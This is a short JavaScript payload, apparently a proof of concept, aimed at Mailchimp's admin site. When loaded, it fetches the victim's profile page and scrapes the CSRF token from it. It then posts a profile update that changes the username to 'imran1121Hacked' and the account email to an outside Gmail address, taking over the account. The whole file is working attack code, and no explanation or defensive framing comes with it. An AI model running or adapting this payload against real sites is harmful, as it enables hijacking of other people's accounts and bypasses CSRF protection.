function takeover(){

	console.log('Taking Over Now....');
	url2='https://us1.admin.mailchimp.com/i/account/profile/post/'
	var xhttp2 = new XMLHttpRequest();
	xhttp2.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {

       // Typical action to be performed when the document is ready:
       //document.getElementById("demo").innerHTML = xhttp.responseText;
    }
};
xhttp2.open("POST", url2, true);
xhttp2.setRequestHeader("Content-Type","application/x-www-form-urlencoded")


	csrf_tokenX=''

	url='https://us1.admin.mailchimp.com/i/account/profile/'

	var xhttp = new XMLHttpRequest();
	xhttp.onreadystatechange = function() {

    if (this.readyState == 4 && this.status == 200) {
       res = xhttp.responseText;
       indx=res.search("csrfToken")
       token=res.slice(indx,indx+70).split('"')[1]
        csrf_tokenX=token;
        xhttp2.send("username=imran1121Hacked&fname=imran&lname=parray&email=hackerscreed1121Hacked%40gmail.com&url=https%3A%2F%2Fgoogle.com&current_password=&password=&confirm_password=&__csrf_token="+csrf_tokenX+"&__fallback__=true&sec_type=undefined&sec_answer=undefined");

	    }
	};
	xhttp.open("GET", url, true);
	xhttp.send();


//Taking OVER

}

takeover();
